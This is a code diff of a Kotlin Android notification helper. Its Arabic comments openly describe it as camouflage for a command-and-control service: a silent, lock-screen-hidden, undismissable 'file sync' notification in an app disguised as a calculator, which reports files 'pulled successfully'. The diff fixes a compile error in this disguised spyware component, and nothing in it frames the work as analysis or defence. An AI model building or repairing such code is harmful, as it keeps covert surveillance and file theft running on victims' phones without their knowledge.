@@ -1,6 +1,7 @@
 package com.example.disguise.util
 
 import android.app.Notification
+import android.app.NotificationManager
 import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
@@ -12,22 +13,19 @@ import com.example.disguise.R
 /**
  * Notifier — ينشئ إشعار الخدمة الأمامية (Foreground Service Notification).
  *
- * لماذا هذا الملف؟
- * - C2Service يحتاج إشعاراً دائماً ليُعتبر Foreground Service.
- * - الإشعار يجب أن يبدو طبيعياً (تمويه): "مزامنة الملفات جارية".
- * - Android 8+ يتطلب قناة إشعارات (Channel) — ننشئها في C2Service،
- *   لكن هذا الملف يبني الإشعار نفسه.
+ * ✅ إصلاح: Notifier هو object (singleton)، لذا لا يمكن أن يحتوي على
+ * companion object بداخله (هذا غير مسموح في Kotlin). الثوابت نُقلت
+ * مباشرة داخل object.
  *
  * التمويه:
  * - العنوان: "مزامنة الملفات"
  * - النص: "جارٍ مزامنة ملفاتك في الخلفية"
- * - الأيقونة: أيقونة التطبيق (آلة حاسبة)
+ * - الأيقونة: ic_sync (سهمان دائريان)
  * - الضغط: يفتح MainActivity (واجهة الآلة الحاسبة)
  *
  * ملاحظات Android 13+:
  * - POST_NOTIFICATIONS إذن مطلوب لعرض الإشعار.
  * - إذا لم يُمنح، الإشعار لن يظهر لكن الخدمة تعمل.
- * - MainActivity يجب أن تطلب الإذن عند التشغيل.
  *
  * ملاحظات Android 14+:
  * - يجب التصريح بـ foregroundServiceType في Manifest (dataSync).
@@ -35,16 +33,12 @@ import com.example.disguise.R
  */
 object Notifier {
 
-    companion object {
-        // معرف الإشعار (ثابت، حتى نتمكن من تحديثه أو إلغائه)
-        const val NOTIFICATION_ID = 1001
-
-        // معرف القناة (يجب أن يطابق ما في C2Service)
-        const val CHANNEL_ID = "sync_channel"
-    }
+    // ✅ الثوابت مباشرة (بدون companion object)
+    const val NOTIFICATION_ID = 1001
+    const val CHANNEL_ID = "sync_channel"
 
     /**
-     * بناء الإشعار المموّه.
+     * بناء الإشعار المموّه (الافتراضي للخدمة الأمامية).
      *
      * @param context السياق (عادةً C2Service)
      * @param channelId معرف القناة (افتراضي: CHANNEL_ID)
@@ -77,17 +71,16 @@ object Notifier {
         val builder = NotificationCompat.Builder(context, channelId)
             .setContentTitle(context.getString(R.string.notif_title))
             .setContentText(context.getString(R.string.notif_text))
-            .setSmallIcon(R.drawable.ic_sync)          // أيقونة صغيرة (يجب أن تكون موجودة)
+            .setSmallIcon(R.drawable.ic_sync)              // أيقونة صغيرة (موجودة في drawable)
             .setContentIntent(pendingIntent)
-            .setOngoing(true)                            // لا يمكن إزالته بالسحب
-            .setSilent(true)                             // بدون صوت
-            .setPriority(NotificationCompat.PRIORITY_LOW) // أولوية منخفضة (لا يزعج)
+            .setOngoing(true)                               // لا يمكن إزالته بالسحب
+            .setSilent(true)                                // بدون صوت
+            .setPriority(NotificationCompat.PRIORITY_LOW)   // أولوية منخفضة
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET) // لا يظهر على شاشة القفل
-            .setShowWhen(false)                          // لا يعرض الوقت
+            .setShowWhen(false)                             // لا يعرض الوقت
 
-        // Android 14+ (API 34): يجب تحديد نوع الخدمة في الإشعار
-        // (لكن هذا يتم عبر foregroundServiceType في Manifest، وليس هنا)
+        // Android 12+ (API 31): عرض فوري بدلاً من تأخير 10 ثوانٍ
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             builder.setForegroundServiceBehavior(
                 NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
@@ -133,20 +126,21 @@ object Notifier {
     /**
      * إشعار بسيط (غير Foreground) للرسائل العابرة.
      * مثلاً: "تم سحب الملف بنجاح".
-     *
-     * @param title العنوان
-     * @param text النص
      */
     fun showSimple(context: Context, title: String, text: String) {
-        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE)
-                as android.app.NotificationManager
-        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
-            .setContentTitle(title)
-            .setContentText(text)
-            .setSmallIcon(R.drawable.ic_sync)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setAutoCancel(true)
-            .build()
-        manager.notify(System.currentTimeMillis().toInt(), notification)
+        try {
+            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE)
+                    as NotificationManager
+            val notification = NotificationCompat.Builder(context, CHANNEL_ID)
+                .setContentTitle(title)
+                .setContentText(text)
+                .setSmallIcon(R.drawable.ic_sync)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setAutoCancel(true)
+                .build()
+            manager.notify(System.currentTimeMillis().toInt(), notification)
+        } catch (e: Exception) {
+            android.util.Log.e("Notifier", "showSimple error: ${e.message}", e)
+        }
     }
 }
